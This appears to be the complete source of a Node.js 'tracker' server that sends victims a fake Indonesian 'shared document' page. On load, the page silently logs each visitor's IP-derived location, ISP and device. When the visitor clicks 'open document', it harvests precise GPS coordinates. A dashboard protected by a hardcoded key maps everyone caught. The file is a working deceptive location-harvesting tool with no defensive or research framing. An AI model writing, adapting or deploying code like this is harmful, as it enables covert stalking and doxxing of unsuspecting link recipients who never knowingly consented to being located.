const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;
const DASH_KEY = 'gilang123'; 

const TLOG = path.join(__dirname, '_tlog');
const GEO_FILE = path.join(TLOG, 'geo.tsv');
const GPS_FILE = path.join(TLOG, 'gps.tsv');

if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');

function clientIp(req) {
  const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
  return raw.replace(/^::ffff:/, '');
}

function cleanSlug(s) { return String(s || '').replace(/[^A-Za-z0-9]/g, ''); }
function appendLog(file, line) { try { fs.appendFileSync(file, line + '\n'); } catch (e) {} }

function detectDevice(ua) {
  if (!ua) return 'Unknown Device';
  let os = 'Desktop';
  if (/android/i.test(ua)) os = 'Android';
  else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
  
  let browser = 'Browser';
  if (/chrome|crios/i.test(ua)) browser = 'Chrome';
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
  else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';

  let model = '';
  const match = ua.match(/\(([^)]+)\)/);
  if (match && match[1]) {
     const parts = match[1].split(';');
     if (parts.length > 2) model = parts[2].trim(); 
  }
  
  return `${os} ${model ? '| ' + model : ''} | ${browser}`;
}

async function ipGeo(ip) {
  const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query,proxy,hosting`;
  try {
    const r = await fetch(url, { signal: AbortSignal.timeout(4000) });
    const data = await r.json();
    return data && data.status === 'success' ? data : { status: 'fail', query: ip };
  } catch (e) { return { status: 'fail', query: ip }; }
}

app.set('trust proxy', true); 
app.use(express.json({ limit: '128kb' }));
app.use(express.urlencoded({ extended: false }));

app.get('/api/geoip', async (req, res) => {
  res.set('Cache-Control', 'no-store');
  const ip = clientIp(req);
  const slug = cleanSlug(req.query.s);
  const ua = req.headers['user-agent'] || '-';
  const device = detectDevice(ua);
  
  const data = await ipGeo(ip);
  const row = [new Date().toISOString(), slug || '-', ip, data.city || '-', data.regionName || '-', data.lat ?? '-', data.lon ?? '-', data.isp || '-', device].join('\t');
  appendLog(GEO_FILE, row);
  
  res.json({ ...data, device });
});

app.post('/api/gps', (req, res) => {
  const d = req.body && typeof req.body === 'object' ? { ...req.body } : {};
  d.ip = clientIp(req); d.ua = req.headers['user-agent'] || '-'; d.device = detectDevice(d.ua); d.ts_server = new Date().toISOString();
  appendLog(GPS_FILE, JSON.stringify(d));
  res.json({ ok: true });
});

app.get('/dash', (req, res) => {
  if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
  
  const pins = [];
  try {
    for (const line of fs.readFileSync(GEO_FILE, 'utf8').split('\n').filter(Boolean)) {
      const c = line.split('\t');
      if (c.length < 9) continue;
      const lat = parseFloat(c[5]), lon = parseFloat(c[6]);
      if (!isFinite(lat) || !isFinite(lon) || (lat === 0 && lon === 0)) continue;
      pins.push({ lat, lon, label: `IP: ${c[3]}, ${c[4]}`, src: 'IP', ip: c[2], time: c[0], slug: c[1], isp: c[7], device: c[8] });
    }
  } catch (_) {}
  
  try {
    for (const line of fs.readFileSync(GPS_FILE, 'utf8').split('\n').filter(Boolean)) {
      let d; try { d = JSON.parse(line); } catch (_) { continue; }
      if (d.src !== 'gps' || typeof d.lat !== 'number') continue;
      pins.push({ lat: d.lat, lon: d.lon, label: `GPS Presisi (Akurasi ${Math.round(d.acc || 0)}m)`, src: 'GPS', ip: d.ip || '-', time: d.ts_server || '-', slug: d.slug || '-', isp: 'Koneksi HP', device: d.device || 'Unknown' });
    }
  } catch (_) {}

  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Dash</title><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"><style>body{margin:0}#map{height:100vh;font-family:sans-serif}</style></head><body><div id="map"></div><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><script>const pins = ${JSON.stringify(pins)};const map = L.map('map').setView([-2.5,118], 4);L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);pins.forEach(p => {const isGPS = p.src === 'GPS';const iconColor = isGPS ? '#00aa55' : '#cc3333';L.circleMarker([p.lat, p.lon], {radius: isGPS ? 8 : 5, color: iconColor, fillColor: iconColor, fillOpacity: 0.7, weight: 2}).bindPopup(\`<div style="font-size:13px; line-height:1.4;"><b style="color:\${iconColor}">\${p.label}</b><br><hr style="margin:4px 0; border:0; border-top:1px solid #eee;"><b>Device:</b> \${p.device}<br><b>IP:</b> \${p.ip}<br><b>ISP:</b> \${p.isp}<br><b>Waktu:</b> \${p.time}<br><b>Link:</b> \${p.slug}</div>\`).addTo(map);});</script></body></html>`);
});

app.get('*', (req, res) => {
  const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
  res.type('html').send(`<!doctype html><html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Dokumen</title><style>body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#f5f6f8;font-family:sans-serif}.card{background:#fff;padding:30px;border-radius:14px;text-align:center}.btn{background:#0066cc;color:#fff;padding:10px 20px;border-radius:8px;border:0}</style></head><body><div class="card"><h1>Dokumen dibagikan</h1><button class="btn" id="openBtn">Buka dokumen</button></div><script>(function(){const slug = ${JSON.stringify(slug)};fetch('/api/geoip?s='+encodeURIComponent(slug)).catch(()=>{});const send = p => fetch('/api/gps',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)}).catch(()=>{});document.getElementById('openBtn').addEventListener('click',()=>{if(navigator.geolocation)navigator.geolocation.getCurrentPosition(p=>send({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug}),e=>send({src:'gps_err',err:e.code,slug}));});})();</script></body></html>`);
});

http.createServer(app).listen(PORT, '0.0.0.0', () => {
  console.log(`[TRACKER] Nyala di port ${PORT}`);
});
